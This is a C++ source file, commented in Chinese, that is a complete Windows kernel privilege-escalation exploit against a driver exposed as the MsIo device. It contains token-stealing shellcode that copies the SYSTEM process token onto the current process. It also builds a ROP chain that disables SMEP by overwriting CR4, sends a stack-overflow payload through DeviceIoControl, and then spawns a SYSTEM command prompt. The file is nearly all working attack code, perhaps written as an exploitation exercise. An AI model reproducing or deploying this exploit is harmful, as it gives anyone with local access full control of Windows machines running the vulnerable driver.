#include <Windows.h>
#include <Psapi.h>
#include <iostream>

#define SymLinkName "\\\\.\\MsIo"

// 1. 找 ntoskrnl.exe 的起始位址
LPVOID GetBaseAddr(const char* drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    // 用 EnumDeviceDrivers 列舉所有驅動程式的起始位址
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            // 用 GetDeviceDriverBaseNameA 取得驅動程式的名稱，並比對是不是我們要找的目標
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (strcmp(szDrivers, drvname) == 0)
                {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}


VOID eopMsio(HANDLE hFile, INT64 kernel_base)
{
    // 寫入提權的 Shellcode
    BYTE token_steal[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"    // mov rdx, [gs:188h]     ; 從 KPCR 取得 ETHREAD 位址
        "\x4C\x8B\x82\xB8\x00\x00\x00"            // mov r8, [rdx + b8h]    ; 從 ETHREAD 取得 EPROCESS 位址
        "\x4D\x8B\x88\xe8\x02\x00\x00"    // mov r9, [r8 + 2e8h]    ; 從 EPROCESS 取得 ActiveProcessLinks 的 List Head 位址
        "\x49\x8B\x09"                    // mov rcx, [r9]          ; 取得 List 中第一個 Process 的 ActiveProcessLinks
        // find_system_proc:
        "\x48\x8B\x51\xF8"    // mov rdx, [rcx - 8]    ; 取得在 ActiveProcessLinks (0x2e8) 前面的 UniqueProcessId (0x2e0)
        "\x48\x83\xFA\x04"    // cmp rdx, 4            ; 確認 UniqueProcessId 是不是 System Process (pid: 4)
        "\x74\x05"            // jz found_system       ; 如果是 System 就跳到 found_system
        "\x48\x8B\x09"        // mov rcx, [rcx]        ; 不是 System 就繼續從找下個 Process
        "\xEB\xF1"            // jmp find_system_proc
        // found_system:
        "\x48\x8B\x41\x70"    // mov rax, [rcx + 70h]  ; 取得在 ActiveProcessLinks (0x2e8) 後面的 Token (0x358)
        "\x24\xF0"            // and al, 0f0h          ; 清除 TOKEN 的 _EX_FAST_REF 結構後 4 bits 的 flags
        // find_current_process:
        "\x48\x8B\x51\xF8"    // mov rdx, [rcx-8]      ; 取得在 ActiveProcessLinks (0x2e8) 前面的 UniqueProcessId (0x2e0)
        "\x48\x81\xFA\x99\x99\x00\x00"    // cmp rdx, <Current Process>    ; 確認 UniqueProcessId 是不是目標 Process
        "\x74\x05"                        // jz found_cmd      ; 是目標 Process 就跳到 found_current_process
        "\x48\x8B\x09"                    // mov rcx, [rcx]    ; 不是目標 Process 就繼續找下個 Process
        "\xEB\xEE"                        // jmp find_current_process
        // found_current_process:
        "\x48\x89\x41\x70"    // mov [rcx+70h], rax    ; 把目標 Process 的 EPROCESS Token 竄改為 System 的 EPROCESS Token
        "\x48\xc7\xc1\xf8\x06\x15\x00"    // mov rcx, 0x1506f8 ; 把原本 cr4 的值放在 rcx，等等要寫回去
        "\xc3";                           // ret

    // 將 pid 填入 Shellcode
    token_steal[54] = GetCurrentProcessId();
    token_steal[55] = GetCurrentProcessId() >> 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL, sizeof(token_steal), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    // 2. 用 ROP 竄改 cr4
    INT64 pop_rcx_offset = kernel_base + 0x15fc70;    // gadget 1 - pop rcx ; ret
    INT64 mov_cr4_offset = kernel_base + 0x76a02;     // gadget 2 - mov cr4, rcx ; ret
    INT64 wbindv_offset = kernel_base + 0x1175c0;     // gadget 3 - wbinvd ; ret
    INT64 rcx_value = 0x506f8;                        // 要竄改 cr4 關閉 SMEP 的值
    INT64 ret = pop_rcx_offset + 1;                   // gadget 1 - ret

    BYTE input_buff[136] = {0};
    memset(input_buff, '\x41', 72);                               // Stack Overflow 要改到 RIP 前要蓋 72 Bytes
    memcpy(input_buff + 72, (PINT64)&pop_rcx_offset, 8);          // pop rcx
    memcpy(input_buff + 80, (PINT64)&rcx_value, 8);               // 0x506f8
    memcpy(input_buff + 88, (PINT64)&mov_cr4_offset, 8);          // mov cr4, rcx ; 竄改 cr4 關閉 SMEP 的值
    memcpy(input_buff + 96, (PINT64)&wbindv_offset, 8);           // wbinvd; ret
    memcpy(input_buff + 104, (PINT64)&allocated_shellcode, 8);    // 提權用的 Shellcode 位址
    memcpy(input_buff + 112, (PINT64)&mov_cr4_offset, 8);         // mov cr4, rcx ; 把原本 cr4 的值寫回去
    memcpy(input_buff + 120, (PINT64)&ret, 8);                    // ret
    memcpy(input_buff + 128, (PINT64)&ret, 8);                    // ret

    // 3. 送 Payload 到驅動程式觸發漏洞
    DWORD lpBytesReturned = 0x0;
    BOOL triggerIOCTL = DeviceIoControl(hFile, 0x80102040, input_buff, sizeof(input_buff), NULL, 0, &lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
        exit(1);
    }

    // 提權後跳出一個有 system 權限的 cmd
    system("start cmd.exe");
}

int main()
{
    HANDLE hDevice =
        CreateFileA(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        return 0;
    }

    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    eopMsio(hDevice, nt);

    return 0;
}